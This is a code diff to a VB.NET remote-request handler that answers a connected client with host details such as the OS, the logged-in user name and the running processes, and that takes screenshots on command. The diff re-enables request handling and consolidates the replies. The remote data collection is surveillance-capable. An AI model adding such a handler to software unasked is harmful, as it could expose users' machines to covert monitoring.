@@ -31,7 +31,7 @@ Public Class RequestManager
     Private Const EXIT_CODE As String = "21"
 
     Public Sub New(Connec As Connection)
-        me.Connection = Connec
+        Me.Connection = Connec
     End Sub
 
     Public Sub StartResponse()
@@ -45,51 +45,39 @@ Public Class RequestManager
             While Listen
                 Request = Connection.ReadRequest
                 MsgBox(Request)
-                'ManageRequest(Request)
+                ManageRequest(Request)
             End While
         Catch ex As Exception
         End Try
     End Sub
 
     Private Sub ManageRequest(Request As String)
-        Dim Response As String
+        Dim Response As String = ""
         Select Case Request
             Case SO_COMPLETE_NAME
                 Response = SystemInfoModule.getOsFullName
-                Connection.AnswerClient(Response)
             Case SO_PLATFORM
                 Response = SystemInfoModule.getOsPlatform
-                Connection.AnswerClient(Response)
             Case SO_VERSION
                 Response = SystemInfoModule.getOsVersion
-                Connection.AnswerClient(Response)
             Case PC_NAME
                 Response = SystemInfoModule.getComputerName
-                Connection.AnswerClient(Response)
             Case CPU_INFO
                 Response = SystemInfoModule.getCpuInfo
-                Connection.AnswerClient(Response)
             Case TOTAL_RAM
                 Response = SystemInfoModule.getRam
-                Connection.AnswerClient(Response)
             Case DISC_UNITS_LIST
                 Response = SystemInfoModule.getDrivesInformation
-                Connection.AnswerClient(Response)
             Case SCREEN_RESOLUTION
                 Response = SystemInfoModule.getScreenResolution
-                Connection.AnswerClient(Response)
             Case LOGGED_USER_NAME
                 Response = SystemInfoModule.getUserName
-                Connection.AnswerClient(Response)
             Case TIME_ZONE
                 Response = SystemInfoModule.getTimeZone
-                Connection.AnswerClient(Response)
             Case DATE_AND_TIME
                 Response = SystemInfoModule.getDateTime
-                Connection.AnswerClient(Response)
             Case PROCESS_RUNNING_LIST
                 Response = SystemInfoModule.getProcessList
-                Connection.AnswerClient(Response)
             Case TAKE_SCREESHOT
                 SystemControlModule.TakeScreenShot()
             Case SEND_MESSAGE
@@ -111,6 +99,9 @@ Public Class RequestManager
                 Listen = False
                 Connection.CloseClient()
         End Select
+        If (String.IsNullOrWhiteSpace(Response) = False) Then
+            Connection.AnswerClient(Response)
+        End If
     End Sub
 
 End Class
